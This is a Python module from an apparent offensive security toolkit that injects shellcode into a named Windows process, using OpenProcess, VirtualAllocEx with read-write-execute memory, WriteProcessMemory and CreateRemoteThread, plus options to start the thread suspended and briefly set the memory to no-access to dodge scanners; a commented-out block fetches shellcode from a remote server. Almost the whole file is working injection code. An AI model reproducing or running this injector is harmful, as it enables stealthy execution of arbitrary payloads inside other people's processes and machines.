#import utils.arg
import os
import ctypes

from utils.helper import nstate as nstate

CATEGORY = 'core'

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')
            parser.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
            parser.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
            parser.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')

class inject:
    from ctypes import windll
    from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Description = 'Inject shellcode to process'
    Version = '2.0.0'
    delay = 5
    # Target_Process = ''
    # Shellcode = ''
    # StartProcess = False

    def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
        self.input_file = input_file
        self.process_start = process_start
        self.target_process = target_process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect

    # def init():
    #     spName = 'inject'
    #     spArgList = [
    #         ['-i', '--input', '', '', 'Input file for process injection'],
    #         ['-p', '--process', '', '', 'Processname to inject the shellcode'],
    #         ['-r', '--resume-thread', '', 'store_true', 'Start thread suspended and resume after speciefied time'],
    #         ['-s', '--start', '', 'store_true', 'If not active, start the process before injection'],
    #         ['-v', '--virtual-protect', '', 'store_true', 'Deny access on memory for a specified time']
    #         ]
    #     utils.arg.CreateSubParser(spName, inject.Description, spArgList)

        # spArgList = [
        #     # shortflag, flag, choices=, action=, default=, type=, required=, help=
        #     ['-i', '--input', None, None, None, None, True, 'Input file for process injection'],
        #     ['-p', '--process', None, None, None, None, True, 'Processname to inject the shellcode'],
        #     ['-r', '--resume-thread', None, None, None, int, False, 'Start thread suspended and resume after speciefied time'],
        #     ['-s', '--start', None, 'store_true', None, None, False, 'If not active, start the process before injection'],
        #     ['-v', '--virtual-protect', None, None, None, int, False, 'Deny access on memory for a specified time']
        #     ]
        # utils.arg.CreateSubParserEx(spName, inject.Description, spArgList)

    def Start_Process(self):
        tp = self.target_process
        print(f'{nstate.OKBLUE} starting {tp}')
        os.system(tp)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        
        pid = processes[0].ProcessId
        print(f"{nstate.OKGREEN} {self.target_process} process id: {pid}")
        
        return int(pid)
    
    # response = request.urlopen(args.server)
    # shellcode = response.read()

    # if shellcode:
    #   print(f'[*] retrieved the shellcode from {args.server}')

    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)
        kernel32 = self.windll.kernel32
        # constants
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_READWRITE_EXECUTE = 0x40
        PROCESS_ALL_ACCESS = 0x1fffff
        EXECUTE_IMMEDIATLY = 0

        # Function type redefintions
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [self.wintypes.DWORD,self.wintypes.BOOL,self.wintypes.DWORD]
        OpenProcess.restype = self.wintypes.HANDLE

        VirtualAllocEx = kernel32.VirtualAllocEx
        VirtualAllocEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD,self.wintypes.DWORD]
        VirtualAllocEx.restype = self.wintypes.LPVOID

        WriteProcessMemory = kernel32.WriteProcessMemory
        WriteProcessMemory.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, self.wintypes.LPCVOID, ctypes.c_size_t, self.wintypes.LPVOID]
        WriteProcessMemory.restype = self.wintypes.BOOL

        CreateRemoteThread = kernel32.CreateRemoteThread
        CreateRemoteThread.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.LPVOID, self.wintypes.LPVOID, self.wintypes.DWORD, self.wintypes.LPDWORD]
        CreateRemoteThread.restype = self.wintypes.HANDLE

        if self.virtual_protect:
            VirtualProtectEx = kernel32.VirtualProtectEx
            VirtualProtectEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD, self.wintypes.PWORD]
            VirtualProtectEx.restype = self.wintypes.BOOL

        if self.resume_thread or self.virtual_protect:
            ResumeThread = kernel32.ResumeThread
            ResumeThread.argtypes = [self.wintypes.HANDLE]
            ResumeThread.restype = self.wintypes.DWORD

        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [self.wintypes.HANDLE]
        CloseHandle.restype = self.wintypes.BOOL
        process_id = self.get_proc_id()

        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            print(f"{nstate.OKGREEN} Opened a Handle to the process")

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            print(f'{nstate.OKGREEN} Allocated Memory in the process')

        c_null = ctypes.c_int(0)
        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), ctypes.byref(c_null))
        if writing:
            print(f'{nstate.OKGREEN} Wrote The shellcode to memory')
        if self.virtual_protect:
            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_NO_ACCESS")
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            print(f"{nstate.OKBLUE} CreateRemoteThread: START_SUSPENDED")
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            print(f'{nstate.OKGREEN} Injected the shellcode into the process')

        if self.virtual_protect:
            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_READWRITE_EXECUTE")
            #self.sleep(self.delay)
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            print(f"{nstate.OKBLUE} ResumeThread")
            resume = ResumeThread(Injection)
            if resume:
                print(f'{nstate.OKGREEN} Process resumed')

        CloseHandle(phandle)

    def proc_inject():
        return False